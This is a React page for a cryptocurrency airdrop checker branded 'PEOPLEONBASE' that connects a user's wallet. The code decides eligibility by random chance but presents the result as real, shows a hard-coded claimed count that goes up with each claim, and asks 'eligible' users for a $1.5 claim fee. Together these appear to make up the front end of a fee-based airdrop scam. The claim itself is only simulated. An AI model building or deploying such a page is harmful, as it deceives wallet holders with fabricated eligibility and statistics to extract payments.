"use client"

import { useState, useEffect } from "react"
import { useAccount } from "wagmi"
import { ConnectButton } from "@rainbow-me/rainbowkit"

export default function HomePage() {
  const [totalClaimed, setTotalClaimed] = useState(1247)
  const [checkResult, setCheckResult] = useState<"eligible" | "ineligible" | null>(null)
  const [isChecking, setIsChecking] = useState(false)
  const [hasClaimed, setHasClaimed] = useState(false)
  const [isClaiming, setIsClaiming] = useState(false)

  // From Wagmi (real wallet connection)
  const { address, isConnected } = useAccount()

  // Simulate initial stat fetch
  useEffect(() => {
    setTotalClaimed(1247)
  }, [])

  const checkAirdrop = async () => {
    if (!isConnected) return
    setIsChecking(true)
    setCheckResult(null)

    // Simulate API call delay
    await new Promise((resolve) => setTimeout(resolve, 1500))

    // Mock eligibility check
    const isEligible = Math.random() > 0.6
    setCheckResult(isEligible ? "eligible" : "ineligible")

    setIsChecking(false)
  }

  const handleClaim = async () => {
    if (!isConnected) return

    setIsClaiming(true)
    try {
      // Simulate contract call with $1.5 fee
      await new Promise((resolve) => setTimeout(resolve, 2000))

      setHasClaimed(true)
      setTotalClaimed((prev) => prev + 1)
    } catch (error) {
      console.error("Claim failed:", error)
    } finally {
      setIsClaiming(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 flex flex-col items-center justify-center text-white px-4">
      {/* Logo */}
      <div className="mb-8">
        <div className="w-16 h-16 bg-blue-400/30 rounded-lg flex items-center justify-center backdrop-blur-sm border border-blue-300/20">
          <span className="text-2xl font-bold text-white">P</span>
        </div>
      </div>

      {/* Main Title */}
      <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide">PEOPLEONBASE</h1>

      {/* Subtitle */}
      <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>

      {/* Wallet Connect */}
      <div className="mb-6">
        <ConnectButton />
      </div>

      <div className="w-full max-w-md mb-12 space-y-4">
        <button
          onClick={checkAirdrop}
          disabled={!isConnected || isChecking}
          className="w-full py-3 bg-blue-500 hover:bg-blue-400 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-colors duration-200 backdrop-blur-sm border border-blue-300/20"
        >
          {isChecking ? "Checking..." : "Check Airdrop"}
        </button>

        {checkResult && (
          <div
            className={`p-4 rounded-lg backdrop-blur-sm border ${
              checkResult === "eligible"
                ? "bg-green-500/20 border-green-300/30 text-green-100"
                : "bg-red-500/20 border-red-300/30 text-red-100"
            }`}
          >
            <div className="text-center">
              <div className="text-lg font-semibold mb-2">
                {checkResult === "eligible" ? "🎉 Eligible!" : "❌ Not Eligible"}
              </div>
              <div className="text-sm">
                {checkResult === "eligible"
                  ? "Your wallet is eligible for the airdrop!"
                  : "Your wallet is not eligible for this airdrop."}
              </div>

              {checkResult === "eligible" && !hasClaimed && (
                <div className="mt-4 space-y-2">
                  <div className="text-xs text-green-200 mb-2">Claim fee: $1.5 (paid on Base network)</div>
                  <button
                    onClick={handleClaim}
                    disabled={isClaiming}
                    className="px-6 py-2 bg-green-500 hover:bg-green-400 disabled:bg-green-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-colors duration-200"
                  >
                    {isClaiming ? "Claiming..." : "Claim Airdrop"}
                  </button>
                  {isConnected && address && (
                    <div className="text-xs text-green-200">
                      Connected: {address.slice(0, 6)}...{address.slice(-4)}
                    </div>
                  )}
                </div>
              )}

              {hasClaimed && <div className="mt-3 text-green-200 font-semibold">✅ Successfully Claimed!</div>}
            </div>
          </div>
        )}
      </div>

      <div className="text-center space-y-6">
        <div className="text-blue-200 text-sm uppercase tracking-wider">AIRDROP STATS</div>

        <div className="text-center">
          <div className="text-4xl md:text-5xl font-bold text-yellow-400">{totalClaimed}</div>
          <div className="text-lg text-blue-200 mt-2">Claimed</div>
        </div>
      </div>
    </div>
  )
}
